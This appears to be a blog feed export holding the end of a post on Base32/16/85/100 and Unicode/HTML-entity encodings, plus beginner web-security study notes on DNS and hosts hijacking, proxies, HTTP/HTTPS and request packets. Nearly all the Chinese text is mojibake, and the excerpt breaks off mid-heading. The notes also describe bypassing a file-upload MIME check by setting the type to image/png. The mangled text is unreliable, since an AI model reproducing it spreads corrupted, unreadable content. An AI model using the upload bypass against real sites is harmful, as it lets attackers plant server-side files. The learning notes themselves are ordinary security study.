è¾“æ˜¯æŒ‰ç…§8æ¯”ç‰¹ä¸€ç»„è¿›è¡Œï¼ˆå³ä¸€ä¸ªå­—èŠ‚ï¼‰ï¼Œå› æ­¤Base32æŒ‰5æ¯”ç‰¹åˆ‡åˆ†çš„äºŒè¿›åˆ¶æ•°æ®å¿…é¡»æ˜¯40æ¯”ç‰¹çš„å€æ•°ï¼ˆ5å’Œ8çš„æœ€å°å…¬å€æ•°ï¼‰ã€‚ä¾‹å¦‚è¾“å…¥å•å­—èŠ‚å­—ç¬¦â€œ%â€ï¼Œå®ƒå¯¹åº”çš„äºŒè¿›åˆ¶å€¼æ˜¯â€œ100101â€ï¼Œå‰é¢è¡¥ä¸¤ä¸ª0å˜æˆâ€œ00100101â€ï¼ˆäºŒè¿›åˆ¶å€¼ä¸è¶³8æ¯”ç‰¹çš„éƒ½è¦åœ¨é«˜ä½åŠ 0ç›´åˆ°8æ¯”ç‰¹ï¼‰ï¼Œä»å·¦ä¾§å¼€å§‹æŒ‰ç…§5æ¯”ç‰¹åˆ‡åˆ†æˆä¸¤ç»„ï¼šâ€œ00100â€å’Œâ€œ101â€ï¼Œåä¸€ç»„ä¸è¶³5æ¯”ç‰¹ï¼Œåˆ™åœ¨æœ«å°¾å¡«å……0ç›´åˆ°5æ¯”ç‰¹ï¼Œå˜æˆâ€œ00100â€å’Œâ€œ10100â€ï¼Œè¿™ä¸¤ç»„äºŒè¿›åˆ¶æ•°åˆ†åˆ«è½¬æ¢æˆåè¿›åˆ¶æ•°ï¼Œé€šè¿‡ä¸Šè¿°è¡¨æ ¼å³å¯æ‰¾åˆ°å…¶å¯¹åº”çš„å¯æ‰“å°å­—ç¬¦â€œEâ€å’Œâ€œUâ€ï¼Œä½†æ˜¯è¿™é‡Œåªç”¨åˆ°ä¸¤ç»„å…±10æ¯”ç‰¹ï¼Œè¿˜å·®30æ¯”ç‰¹è¾¾åˆ°40æ¯”ç‰¹ï¼ŒæŒ‰ç…§5æ¯”ç‰¹ä¸€ç»„è¿˜éœ€6ç»„ï¼Œåˆ™åœ¨æœ«å°¾å¡«å……6ä¸ªâ€œ&#x3D;â€ã€‚å¡«å……â€œ&#x3D;â€ç¬¦å·çš„ä½œç”¨æ˜¯æ–¹ä¾¿ä¸€äº›ç¨‹åºçš„æ ‡å‡†åŒ–è¿è¡Œï¼Œå¤§å¤šæ•°æƒ…å†µä¸‹ä¸æ·»åŠ ä¹Ÿæ— å…³ç´§è¦ï¼Œè€Œä¸”ï¼Œåœ¨URLä¸­ä½¿ç”¨æ—¶å¿…é¡»å»æ‰â€œ&#x3D;â€ç¬¦å·ã€‚</p><p><u>ä¸Base64ç›¸æ¯”ï¼ŒBase32å…·æœ‰è®¸å¤šä¼˜ç‚¹ï¼š</u></p><p>1.é€‚åˆä¸åŒºåˆ†å¤§å°å†™çš„æ–‡ä»¶ç³»ç»Ÿï¼Œæ›´åˆ©äºäººç±»å£è¯­äº¤æµæˆ–è®°å¿†ã€‚</p><p>2.ç»“æœå¯ä»¥ç”¨ä½œæ–‡ä»¶åï¼Œå› ä¸ºå®ƒä¸åŒ…å«è·¯å¾„åˆ†éš”ç¬¦ â€œ&#x2F;â€ç­‰ç¬¦å·ã€‚</p><p>3.æ’é™¤äº†è§†è§‰ä¸Šå®¹æ˜“æ··æ·†çš„å­—ç¬¦ï¼Œå› æ­¤å¯ä»¥å‡†ç¡®çš„äººå·¥å½•å…¥ã€‚ï¼ˆä¾‹å¦‚ï¼ŒRFC4648ç¬¦å·é›†å¿½ç•¥äº†æ•°å­—â€œ1â€ã€â€œ8â€å’Œâ€œ0â€ï¼Œå› ä¸ºå®ƒä»¬å¯èƒ½ä¸å­—æ¯â€œIâ€ï¼Œâ€œBâ€å’Œâ€œOâ€æ··æ·†ï¼‰ã€‚</p><p>4.æ’é™¤å¡«å……ç¬¦å·â€œ&#x3D;â€çš„ç»“æœå¯ä»¥åŒ…å«åœ¨URLä¸­ï¼Œè€Œä¸ç¼–ç ä»»ä½•å­—ç¬¦ã€‚</p><p><u>Base32ä¹Ÿæ¯”Base16æœ‰ä¼˜åŠ¿ï¼š</u></p><p><strong>Â·</strong>Base32æ¯”Base16å ç”¨çš„ç©ºé—´æ›´å°ã€‚ï¼ˆ1000æ¯”ç‰¹æ•°æ®Base32éœ€è¦200ä¸ªå­—ç¬¦ï¼Œè€ŒBase16åˆ™ä¸º250ä¸ªå­—ç¬¦ï¼‰</p><p><u>Base32çš„ç¼ºç‚¹ï¼š</u></p><p><strong>Â·</strong>Base32æ¯”Base64å¤šå ç”¨å¤§çº¦20ï¼…çš„ç©ºé—´ã€‚å› ä¸ºBase32ä½¿ç”¨8ä¸ªASCIIå­—ç¬¦å»ç¼–ç åŸæ•°æ®ä¸­çš„5ä¸ªå­—èŠ‚æ•°æ®ï¼Œè€ŒBase64æ˜¯ä½¿ç”¨4ä¸ªASCIIå­—ç¬¦å»ç¼–ç åŸæ•°æ®ä¸­çš„3ä¸ªå­—èŠ‚æ•°æ®ã€‚</p><h2 id="4ã€Base16â€”â€”ç¤ºä¾‹"><a href="#4ã€Base16â€”â€”ç¤ºä¾‹" class="headerlink" title="4ã€Base16â€”â€”ç¤ºä¾‹"></a>4ã€Base16â€”â€”ç¤ºä¾‹</h2><p><u><strong>61646D696E</strong></u></p><p>å®ƒçš„ç‰¹ç‚¹æ˜¯<u>æ²¡æœ‰ç­‰å·</u>å¹¶ä¸”<u>æ•°å­—è¦å¤šäºå­—æ¯</u></p><p>Base16ç¼–ç çš„æ–¹å¼ï¼š</p><p>1.å°†æ•°æ®(æ ¹æ®ASCIIç¼–ç ï¼ŒUTF-8ç¼–ç ç­‰)è½¬æˆå¯¹åº”çš„äºŒè¿›åˆ¶æ•°ï¼Œä¸è¶³8æ¯”ç‰¹ä½é«˜ä½è¡¥0ã€‚ç„¶åå°†æ‰€æœ‰çš„äºŒè¿›åˆ¶å…¨éƒ¨ä¸²èµ·æ¥ï¼Œ4ä¸ªäºŒè¿›åˆ¶ä½ä¸ºä¸€ç»„ï¼Œè½¬åŒ–æˆå¯¹åº”åè¿›åˆ¶æ•°ã€‚</p><p>2.æ ¹æ®åè¿›åˆ¶æ•°å€¼æ‰¾åˆ°Base16ç¼–ç è¡¨é‡Œé¢å¯¹åº”çš„å­—ç¬¦ã€‚Base16æ˜¯4ä¸ªæ¯”ç‰¹ä½è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥åŸå§‹æ˜¯1ä¸ªå­—èŠ‚(8ä¸ªæ¯”ç‰¹ä½)åˆšå¥½å¯ä»¥åˆ†æˆä¸¤ç»„,ä¹Ÿå°±æ˜¯è¯´åŸå…ˆå¦‚æœä½¿ç”¨ASCIIç¼–ç åçš„ä¸€ä¸ªå­—ç¬¦ï¼Œç°åœ¨è½¬åŒ–æˆä¸¤ä¸ªå­—ç¬¦ã€‚æ•°æ®é‡æ˜¯åŸå…ˆçš„2å€ã€‚</p><p><img src="/2022/07/21/Reverso-Context/image-20220721193743306.png" alt="image-20220721193743306"></p><p>Base16ç¼–ç æ˜¯ä¸€ä¸ªæ ‡å‡†çš„åå…­è¿›åˆ¶å­—ç¬¦ä¸²ï¼ˆæ³¨æ„æ˜¯å­—ç¬¦ä¸²è€Œä¸æ˜¯æ•°å€¼ï¼‰ï¼Œæ›´æ˜“è¢«äººç±»å’Œè®¡ç®—æœºä½¿ç”¨ï¼Œå› ä¸ºå®ƒå¹¶ä¸åŒ…å«ä»»ä½•æ§åˆ¶å­—ç¬¦ï¼Œä»¥åŠBase64å’ŒBase32ä¸­çš„â€œ&#x3D;â€ç¬¦å·ã€‚</p><p><img src="/2022/07/21/Reverso-Context/image-20220721193802684.png" alt="image-20220721193802684"></p><h2 id="5ã€Base85â€”â€”ç¤ºä¾‹"><a href="#5ã€Base85â€”â€”ç¤ºä¾‹" class="headerlink" title="5ã€Base85â€”â€”ç¤ºä¾‹"></a>5ã€Base85â€”â€”ç¤ºä¾‹</h2><p><u><strong>@:X4hDWe0rkE(G[OdP4CT]N#</strong></u></p><p>ç‰¹ç‚¹æ˜¯<u>å¥‡æ€ªçš„å­—ç¬¦æ¯”è¾ƒå¤š</u>ï¼Œä½†æ˜¯å¾ˆéš¾å‡ºç°ç­‰å·</p><p><img src="/2022/07/21/Reverso-Context/image-20220721193845924.png" alt="image-20220721193845924"></p><h2 id="6ã€Base100â€”â€”ç¤ºä¾‹"><a href="#6ã€Base100â€”â€”ç¤ºä¾‹" class="headerlink" title="6ã€Base100â€”â€”ç¤ºä¾‹"></a>6ã€Base100â€”â€”ç¤ºä¾‹</h2><p><u><strong>????????????????????</strong></u></p><p>ç‰¹ç‚¹å°±æ˜¯ä¸€å †Emojiè¡¨æƒ…</p><p>Base100ç¼–ç &#x2F;è§£ç å·¥å…·ï¼ˆåˆåï¼šEmojiè¡¨æƒ…ç¬¦å·ç¼–ç &#x2F;è§£ç ï¼‰ï¼Œå¯å°†æ–‡æœ¬å†…å®¹ç¼–ç ä¸ºEmojiè¡¨æƒ…ç¬¦å·ï¼›åŒæ—¶ä¹Ÿå¯ä»¥å°†ç¼–ç åçš„Emojiè¡¨æƒ…ç¬¦å·å†…å®¹è§£ç ä¸ºæ–‡æœ¬ã€‚</p><p><img src="/2022/07/21/Reverso-Context/image-20220721193925524.png" alt="image-20220721193925524"></p><h2 id="å¸¸ç”¨è§£å¯†ç½‘ç«™ï¼š-1"><a href="#å¸¸ç”¨è§£å¯†ç½‘ç«™ï¼š-1" class="headerlink" title="å¸¸ç”¨è§£å¯†ç½‘ç«™ï¼š"></a>å¸¸ç”¨è§£å¯†ç½‘ç«™ï¼š</h2><p>Base64ï¼š</p><p><code>tool.oschina.net</code></p><p><code>www.sojson.com</code></p><p><code>base64.us</code></p><p>Base58ï¼š</p><p><code>www.metools.info</code></p><p>Base32ã€16ï¼š</p><p><code>www.qqxiuzi.cn</code></p><p>Base100ï¼š</p><p><code>www.atoolbox.net</code></p><hr><h2 id="1ã€Unicodeâ€”â€”æ±‰å­—ç¤ºä¾‹"><a href="#1ã€Unicodeâ€”â€”æ±‰å­—ç¤ºä¾‹" class="headerlink" title="1ã€Unicodeâ€”â€”æ±‰å­—ç¤ºä¾‹"></a>1ã€Unicodeâ€”â€”æ±‰å­—ç¤ºä¾‹</h2><figure class="highlight cal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ±‰å­—ç¤ºä¾‹&amp;<span class="string">#36825</span>ï¼ˆè¿™ï¼‰;ã€å­—æ¯ç¤ºä¾‹&amp;<span class="string">#116</span>ï¼ˆtï¼‰;ã€æ•°å­—ç¬¦å·ç¤ºä¾‹&amp;<span class="string">#53</span>ï¼ˆ<span class="number">5</span>ï¼‰;</span><br></pre></td></tr></table></figure><p>å¯ä»¥è¯´Unicodeä¸HTMLå®ä½“ç¼–ç æ˜¯ä¸€ä¸ªä¸œè¥¿</p><p>Unicodeï¼ˆç»Ÿä¸€ç ã€ä¸‡å›½ç ã€å•ä¸€ç ï¼‰æ˜¯ä¸€ç§åœ¨è®¡ç®—æœºä¸Šä½¿ç”¨çš„å­—ç¬¦ç¼–ç ã€‚Unicode æ˜¯ä¸ºäº†è§£å†³ä¼ ç»Ÿçš„å­—ç¬¦ç¼–ç æ–¹æ¡ˆçš„å±€é™è€Œäº§ç”Ÿçš„ï¼Œå®ƒä¸ºæ¯ç§è¯­è¨€ä¸­çš„æ¯ä¸ªå­—ç¬¦è®¾å®šäº†ç»Ÿä¸€å¹¶ä¸”å”¯ä¸€çš„äºŒè¿›åˆ¶ç¼–ç ï¼Œä»¥æ»¡è¶³è·¨è¯­è¨€ã€è·¨å¹³å°è¿›è¡Œæ–‡æœ¬è½¬æ¢ã€å¤„ç†çš„è¦æ±‚ã€‚1990å¹´å¼€å§‹ç ”å‘ï¼Œ1994å¹´æ­£å¼å…¬å¸ƒã€‚</p><p><img src="/2022/07/21/Reverso-Context/image-20220721194526725.png" alt="image-20220721194526725"></p><h2 id="2ã€HTMLå®ä½“ç¼–ç â€”â€”ç¤ºä¾‹ä¸Unicodeç›¸åŒ"><a href="#2ã€HTMLå®ä½“ç¼–ç â€”â€”ç¤ºä¾‹ä¸Unicodeç›¸åŒ" class="headerlink" title="2ã€HTMLå®ä½“ç¼–ç â€”â€”ç¤ºä¾‹ä¸Unicodeç›¸åŒ"></a>2ã€HTMLå®ä½“ç¼–ç â€”â€”ç¤ºä¾‹ä¸Unicodeç›¸åŒ</h2><p>å­—ç¬¦å®ä½“æ˜¯ç”¨ä¸€ä¸ªç¼–å·å†™å…¥HTMLä»£ç ä¸­æ¥ä»£æ›¿ä¸€ä¸ªå­—ç¬¦ï¼Œåœ¨ä½¿ç”¨æµè§ˆå™¨è®¿é—®ç½‘é¡µæ—¶ä¼šå°†è¿™ä¸ªç¼–å·è§£æè¿˜åŸä¸ºå­—ç¬¦ä»¥ä¾›é˜…è¯»ã€‚</p><p>è¿™ä¹ˆåšçš„ç›®çš„ä¸»è¦æœ‰ä¸¤ä¸ªï¼š<br>ï¼‘ã€è§£å†³HTMLä»£ç ç¼–å†™ä¸­çš„ä¸€äº›é—®é¢˜ã€‚ä¾‹å¦‚éœ€è¦åœ¨ç½‘é¡µä¸Šæ˜¾ç¤ºå°äºå·ï¼ˆ&lt;ï¼‰å’Œå¤§äºå·ï¼ˆ&gt;ï¼‰ï¼Œç”±äºå®ƒä»¬æ˜¯HTMLçš„é¢„ç•™æ ‡ç­¾ï¼Œå¯èƒ½ä¼šè¢«è¯¯è§£æã€‚è¿™æ—¶å°±éœ€è¦å°†å°äºå·å’Œå¤§äºå·å†™æˆå­—ç¬¦å®ä½“ï¼š<br>å°äºå·è¿™æ ·å†™ï¼š&lt; æˆ– &lt;<br>å¤§äºå·è¿™æ ·å†™ï¼š&gt; æˆ– &gt;<br>å‰é¢çš„å†™æ³•ç§°ä¸ºå®ä½“åç§°ï¼Œåé¢çš„å†™æ³•åˆ™æ˜¯å®ä½“ç¼–å·ã€‚ISO-8859-1å­—ç¬¦é›†ï¼ˆè¥¿æ¬§è¯­è¨€ï¼‰ä¸­ä¸¤ç™¾å¤šä¸ªå­—ç¬¦è®¾å®šäº†å®ä½“åç§°ï¼Œè€Œå¯¹äºå…¶å®ƒæ‰€æœ‰å­—ç¬¦éƒ½å¯ä»¥ç”¨å®ä½“ç¼–å·æ¥ä»£æ›¿ã€‚<br>ï¼’ã€ç½‘é¡µç¼–ç é‡‡ç”¨äº†ç‰¹å®šè¯­è¨€çš„ç¼–ç ï¼Œå´éœ€è¦æ˜¾ç¤ºæ¥è‡ªå…¶å®ƒè¯­è¨€çš„å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œç½‘é¡µç¼–ç é‡‡ç”¨äº†è¥¿æ¬§è¯­è¨€ISO-8859-1ï¼Œå´è¦åœ¨ç½‘é¡µä¸­æ˜¾ç¤ºä¸­æ–‡ï¼Œè¿™æ—¶å¿…é¡»å°†ä¸­æ–‡å­—ç¬¦ä»¥å®ä½“å½¢å¼å†™å…¥HTMLä»£ç ä¸­ã€‚</p><p><img src="/2022/07/21/Reverso-Context/image-20220721194551860.png" alt="image-20220721194551860"></p><h2 id="3ã€16è¿›åˆ¶Unicodeâ€”â€”ç¤ºä¾‹"><a href="#3ã€16è¿›åˆ¶Unicodeâ€”â€”ç¤ºä¾‹" class="headerlink" title="3ã€16è¿›åˆ¶Unicodeâ€”â€”ç¤ºä¾‹"></a>3ã€16è¿›åˆ¶Unicodeâ€”â€”ç¤ºä¾‹</h2><p><u><strong>\u8fd9\u662f\u4e00</strong></u></p><p><img src="/2022/07/21/Reverso-Context/image-20220721194631625.png" alt="image-20220721194631625"></p><p>å¸¸ç”¨è§£å¯†ç½‘ç«™ï¼š</p><p>  <strong>Â·</strong>Unicodeï¼š</p><p><code>www.sojson.com</code></p><p>  <strong>Â·</strong>16è¿›åˆ¶Unicodeï¼š</p><p><code>www.msxindl.com</code></p><p> <strong>Â·</strong>HTMLå­—ç¬¦å®ä½“ï¼š</p><p><code>www.qqxiuzi.cn</code></p><p>â€¦.è¿˜æœ‰ä¸€äº›å¼•å…¥å¯†é’¥çš„éå¯¹ç§°å‹ç®—æ³•ï¼Œå¯ä»¥çœ‹çœ‹åŸæ–‡</p>]]></content>
      
      
      <categories>
          
          <category> ç½‘ç»œå®‰å…¨å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> crypto&amp;misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å°è¿ªwebè§†é¢‘å­¦ä¹ è®°å½•</title>
      <link href="/2022/07/21/xiaodi/"/>
      <url>/2022/07/21/xiaodi/</url>
      
        <content type="html"><![CDATA[<p><u><code>çœ‹çœ‹å°è¿ªå¸ˆå‚…çš„è§†é¢‘ï¼ŒæŠŠä¸€äº›çŸ¥è¯†ç‚¹è¡¥å……ä»¥åŠæ·±å…¥å­¦ä¹ ä¸€ä¸‹ï¼Œåšåšç¬”è®°</code></u></p><p><code>æ—¶é—´ä¸æ˜¯æŒ‰å°è¿ªå¸ˆå‚…è§†é¢‘æ¥çš„ï¼Œæ˜¯çœ‹æˆ‘å½“å¤©çš„æ—¶é—´ï¼Œå°½é‡æ¯å¤©èƒ½çœ‹ä¸ªä¸€ä¸¤ä¸ªå§</code></p><span id="more"></span><h2 id="DAY1-åŸºç¡€å…¥é—¨-æ¦‚å¿µåè¯"><a href="#DAY1-åŸºç¡€å…¥é—¨-æ¦‚å¿µåè¯" class="headerlink" title="DAY1 åŸºç¡€å…¥é—¨-æ¦‚å¿µåè¯"></a>DAY1 åŸºç¡€å…¥é—¨-æ¦‚å¿µåè¯</h2><p><img src="/2022/07/21/xiaodi/image-20220725210618077.png" alt="image-20220725210618077"></p><p><strong>1.DNS</strong>ï¼šä¸€èˆ¬æŒ‡åŸŸåç³»ç»Ÿï¼Œå¯ä»¥å°†IPå’ŒåŸŸåç›¸äº’è½¬åŒ–ï¼Œæ¯”å¦‚è®¿é—®baidu.comï¼ŒDNSå°±ä¼šæŸ¥å‡ºå®ƒçš„IPä¾‹å¦‚120.0.0.1ï¼Œè¿›è¡Œè®¿é—®ï¼Œä»è€Œäººä»¬ä¸ç”¨è¾“å…¥å¤æ‚çš„IP</p><p>æˆ‘ä»¬æœ‰æ—¶<u>æ‰“å¼€ä¸€äº›ç½‘ç«™æˆ–è€…ä¸‹è½½ä¸œè¥¿æ—¶å¡é¡¿</u>ï¼Œæˆ‘ä»¬ç™¾åº¦å¾€å¾€ä¼šå¾—åˆ°ä¸€ä¸ªæ–¹æ³•ä¿®æ”¹<strong>hosts</strong>æ–‡ä»¶</p><p><strong>hosts</strong>æ–‡ä»¶è´Ÿè´£è§£æåŸŸåå¹¶ä¼˜å…ˆäºDNSæœåŠ¡ï¼Œé€šå¸¸å¾ˆå¤šæ¶æ„è½¯ä»¶ä¼šæ¶æ„æ›´æ”¹è¯¥æ–‡ä»¶æ¥è¾¾åˆ°åŠ«æŒç½‘ç«™çš„ç›®åœ°ï¼Œä¹Ÿå°±æ˜¯DNSæ”»å‡»</p><p>æ¯”å¦‚ä¸‹å›¾ï¼Œå½“åœ¨<strong>hosts</strong>æ–‡ä»¶é‡ŒåŠ ä¸Šæ—¶ï¼Œå½“æˆ‘ä»¬åœ¨æµè§ˆå™¨è®¿é—®<code>www.baidu.com</code>çš„æ—¶å€™å°±ä¼šè®¿é—®<strong>IP:14.215.177.38</strong>ï¼Œè€Œè¿™ä¸ª<strong>IP</strong>å¯èƒ½æ˜¯ç™¾åº¦çš„ç½‘ç«™ï¼Œä¹Ÿå¯èƒ½æ˜¯é’“é±¼ç½‘ç«™çš„IPï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å…‰çœ‹æµè§ˆå™¨ç½‘ç«™åŸŸåå°±æ ¹æœ¬åˆ†ä¸æ¸…æ¥šï¼ˆå¦‚æœé’“é±¼ç½‘ç«™é¡µé¢å’Œæˆ‘ä»¬çš„ç›®æ ‡ç½‘ç«™ç•Œé¢ä¸€è‡´ï¼‰</p><p><img src="/2022/07/21/xiaodi/image-20220721145608355.png" alt="image-20220721145608355"></p><hr><h2 id="DAY2-åŸºç¡€å…¥é—¨-æ•°æ®åŒ…æ‹“å±•"><a href="#DAY2-åŸºç¡€å…¥é—¨-æ•°æ®åŒ…æ‹“å±•" class="headerlink" title="DAY2 åŸºç¡€å…¥é—¨-æ•°æ®åŒ…æ‹“å±•"></a>DAY2 åŸºç¡€å…¥é—¨-æ•°æ®åŒ…æ‹“å±•</h2><h3 id="1-proxy"><a href="#1-proxy" class="headerlink" title="1.proxy"></a>1.proxy</h3><p>ä¸‹é¢è¿™å¼ å›¾å¾ˆå¥½çš„è§£é‡Šäº†<strong>proxy</strong>çš„ä½œç”¨ï¼Œå®ƒæ˜¯æµè§ˆå™¨å’ŒæœåŠ¡å™¨ä¹‹é—´çš„ï¼Œæ˜¯ä¸¤è€…æ•°æ®äº¤äº’çš„ä¸­é—´æ¡¥æ¢ï¼Œåˆ©ç”¨<strong>proxy</strong>å°±å¯ä»¥å®ç°ä¿®æ”¹æµè§ˆå™¨å‘é€çš„è¯·æ±‚å’ŒæœåŠ¡å™¨å‘å›çš„æ•°æ®åŒ…ï¼Œæˆ–è€…æ‹¦æˆªè·å–</p><p><img src="/2022/07/21/xiaodi/image-20220721144031544.png" alt="image-20220721144031544"></p><h3 id="2-httpå’Œhttps"><a href="#2-httpå’Œhttps" class="headerlink" title="2.httpå’Œhttps"></a>2.httpå’Œhttps</h3><p><strong>https</strong>ç›¸å¯¹<strong>http</strong>æ›´å®‰å…¨çš„åŸå› åœ¨äº<strong>SSL or TLS</strong>çš„å­˜åœ¨ï¼Œå®ƒä¸åœ¨åƒ<strong>http</strong>ä¸€æ ·æŠŠä¿¡æ¯ä»¥æ˜æ–‡çš„å½¢å¼å‘ˆç°å‡ºæ¥ï¼Œæ¯”å¦‚åˆ©ç”¨<strong>burp</strong>æŠ“åŒ…ï¼Œhttpçš„ä¿¡æ¯ï¼ˆæ¯”å¦‚è´¦å·å¯†ç ï¼‰å°±ä¼šæ˜¾ç°å‡ºæ¥ï¼Œè€Œ<strong>SSL or TLS</strong>ä¼šå¯¹å…¶ä¿¡æ¯è¿›è¡ŒåŠ å¯†<strong>ï¼ˆéœ€è¦ç§é’¥æ‰è§£çš„å¼€ï¼‰</strong>ï¼Œé‚£å°±ç®—è¢«æŠ“åŒ…ï¼Œä¹Ÿåªèƒ½å¾—åˆ°ä¸€ä¸²åŠ å¯†æ•°æ®</p><p><u>è¿™é‡Œæ¨èå¯ä»¥ä¹°æœ¬<strong>ã€Šå›¾è§£httpã€‹</strong>çœ‹çœ‹</u></p><p><img src="/2022/07/21/xiaodi/image-20220721144040328.png" alt="image-20220721144040328"></p><p> ä¸‹é¢æ˜¯httpç®€è¦é€šè®¯æµç¨‹</p><p><img src="/2022/07/21/xiaodi/1.png" alt="image-20220721150847367"></p><p>ä¸‹é¢å°±æ˜¯httpsçš„å“åº”æµç¨‹</p><p><img src="/2022/07/21/xiaodi/image-20220721150429225.png" alt="image-20220721150429225"></p><h3 id="3-Requestè¯·æ±‚æ•°æ®åŒ…"><a href="#3-Requestè¯·æ±‚æ•°æ®åŒ…" class="headerlink" title="3.Requestè¯·æ±‚æ•°æ®åŒ…"></a>3.Requestè¯·æ±‚æ•°æ®åŒ…</h3><p><img src="/2022/07/21/xiaodi/image-20220723220144117.png" alt="image-20220723220144117"></p><h4 id="1-è¯·æ±‚è¡Œ"><a href="#1-è¯·æ±‚è¡Œ" class="headerlink" title="1.è¯·æ±‚è¡Œ"></a>1.è¯·æ±‚è¡Œ</h4><p>å¦‚ä¸‹ä¾‹ï¼Œ</p><p>è¯·æ±‚æ–¹æ³•ï¼šGET   ||  è¯·æ±‚urlï¼šindex.html  ||   HTTPç‰ˆæœ¬ï¼š1.1</p><p><img src="/2022/07/21/xiaodi/image-20220723220333853.png" alt="image-20220723220333853"></p><p><img src="/2022/07/21/xiaodi/image-20220723221340261.png" alt="image-20220723221340261"></p><h4 id="2-è¯·æ±‚å¤´"><a href="#2-è¯·æ±‚å¤´" class="headerlink" title="2.è¯·æ±‚å¤´"></a>2.è¯·æ±‚å¤´</h4><p><img src="/2022/07/21/xiaodi/image-20220724172547877.png" alt="image-20220724172547877"></p><p>1ï¼‰MIMEæ–‡ä»¶æ ¼å¼å¯ä»¥ä¿®æ”¹ç»•è¿‡MIMEéªŒè¯ï¼Œåœ¨æ–‡ä»¶ä¸Šä¼ çš„æ—¶å€™ï¼Œå°±å¯ä»¥ä¿®æ”¹MIMEç±»å‹æ¥ç»•è¿‡å‰ç«¯éªŒè¯</p><p>æ¯”å¦‚éœ€è¦å›¾ç‰‡æ ¼å¼ï¼Œä½†è®¾æœ‰MIMEéªŒè¯ï¼Œè€Œä¸Šä¼ phpæˆ–å…¶ä»–æ–‡ä»¶æ—¶ï¼Œ</p><p>Acceptä¸ºapplication&#x2F;octet-stream   ä¸ºäº†ä¸Šä¼ æˆåŠŸå°±éœ€è¦ä¿®æ”¹å…¶ä¸ºimage&#x2F;pngï¼Œä»è€Œç»•è¿‡MIMEéªŒè¯</p><p><img src="/2022/07/21/xiaodi/image-20220724173613276.png" alt="image-20220724173613276"></p><p>Refererä»£è¡¨äº§ç”Ÿè¯·æ±‚çš„ç½‘é¡µï¼Œå¦‚æœæ˜¯åœ¨è¯¥ç½‘ç«™è®¿é—®è¯¥ç½‘ç«™çš„é“¾æ¥ï¼Œé‚£refererå¯èƒ½ä¸ºç©ºï¼Œå¦‚æœæ˜¯ä»å…¶ä»–ç½‘ç«™è¯·æ±‚è®¿é—®ï¼Œå°±ä¼šåœ¨refererå¤„æ˜¾ç¤ºç½‘ç«™url</p><p>ä¸€äº›ç½‘ç«™å¯èƒ½ä¼šéªŒè¯refereråˆ¤æ–­æ˜¯å¦å¯èƒ½æ˜¯ä»å…¶ä»–ç½‘ç«™æ¥çš„ï¼Œä¿æŠ¤ç”¨æˆ·è´¦å·å®‰å…¨ï¼Œé¿å…ç”¨æˆ·cookieè¢«ç›—ç”¨ï¼Œä¹Ÿå°±æ˜¯csrfæ¼æ´</p><p><img src="/2022/07/21/xiaodi/image-20220724175117961.png" alt="image-20220724175117961"></p><h4 id="3-ç©ºè¡Œå’Œè¯·æ±‚ä½“"><a href="#3-ç©ºè¡Œå’Œè¯·æ±‚ä½“" class="headerlink" title="3.ç©ºè¡Œå’Œè¯·æ±‚ä½“"></a>3.ç©ºè¡Œå’Œè¯·æ±‚ä½“</h4><p><img src="/2022/07/21/xiaodi/image-20220724211529241.png" alt="image-20220724211529241"></p><p>ç©ºè¡Œå’Œè¯·æ±‚ä½“å¯ä»¥çœ‹çœ‹ä¸‹é¢è¿™ä¸ªä¾‹å­</p><p><img src="/2022/07/21/xiaodi/image-20220724203919573.png" alt="image-20220724203919573"></p><p>å¯ä»¥çœ‹åˆ°è¯·æ±‚ä½“æ˜¯<code>id=1&amp;submit=%E6%9F%A5%E8%AF%A2</code>è€Œå…¶ä¸Šé¢å°±æ˜¯å’Œè¯·æ±‚å¤´åˆ†å¼€çš„ç©ºè¡Œ</p><p><img src="/2022/07/21/xiaodi/image-20220724203945852.png" alt="image-20220724203945852"></p><h3 id="4-responseè¿”å›æ•°æ®åŒ…"><a href="#4-responseè¿”å›æ•°æ®åŒ…" class="headerlink" title="4.responseè¿”å›æ•°æ®åŒ…"></a>4.responseè¿”å›æ•°æ®åŒ…</h3><p><img src="/2022/07/21/xiaodi/image-20220724213601900.png" alt="image-20220724213601900"></p><p><u><strong>HTTPå“åº”ç ï¼ˆçŠ¶æ€ç ï¼‰</strong></u></p><p><img src="/2022/07/21/xiaodi/image-20220723215355113.png" alt="image-20220723215355113"></p><h4 id="1-çŠ¶æ€è¡Œ"><a href="#1-çŠ¶æ€è¡Œ" class="headerlink" title="1.çŠ¶æ€è¡Œ"></a>1.çŠ¶æ€è¡Œ</h4><p>ä¸‹ä¾‹<strong>çŠ¶æ€ä»£ç </strong>ï¼š200  || <strong>åè®®ç‰ˆæœ¬</strong>ï¼šHTTP&#x2F;1.1 ||   <strong>çŠ¶æ€æè¿°</strong>ï¼šOK</p><p><img src="/2022/07/21/xiaodi/image-20220724222056594.png" alt="image-20220724222056594"></p><h4 id="2-å“åº”å¤´æ ‡"><a href="#2-å“åº”å¤´æ ‡" class="headerlink" title="2.å“åº”å¤´æ ‡"></a>2.å“åº”å¤´æ ‡</h4><p>ä¸Šå›¾é™¤äº†ç¬¬ä¸€è¡Œä»¥å¤–å°±æ˜¯å“åº”å¤´æ ‡ï¼Œç±»ä¼¼è¯·æ±‚å¤´</p><h4 id="3-ç©ºè¡Œ"><a href="#3-ç©ºè¡Œ" class="headerlink" title="3.ç©ºè¡Œ"></a>3.ç©ºè¡Œ</h4><p>åœ¨å“åº”å¤´æ ‡å’Œå“åº”æ•°æ®ä¹‹é—´ï¼Œè¡¨ç¤ºå“åº”å¤´æ ‡çš„ç»“æŸ</p><h4 id="4-å“åº”æ•°æ®"><a href="#4-å“åº”æ•°æ®" class="headerlink" title="4.å“åº”æ•°æ®"></a>4.å“åº”æ•°æ®</h4><p><strong>å“åº”æ•°æ®</strong>å°±æ˜¯å½“å‰é¡µé¢çš„æºä»£ç </p><p><img src="/2022/07/21/xiaodi/image-20220724222442836.png" alt="image-20220724222442836"></p><hr><h2 id="DAY3-åŸºç¡€å…¥é—¨-æ­å»ºå®‰å…¨æ‹“å±•"><a href="#DAY3-åŸºç¡€å…¥é—¨-æ­å»ºå®‰å…¨æ‹“å±•" class="headerlink" title="DAY3 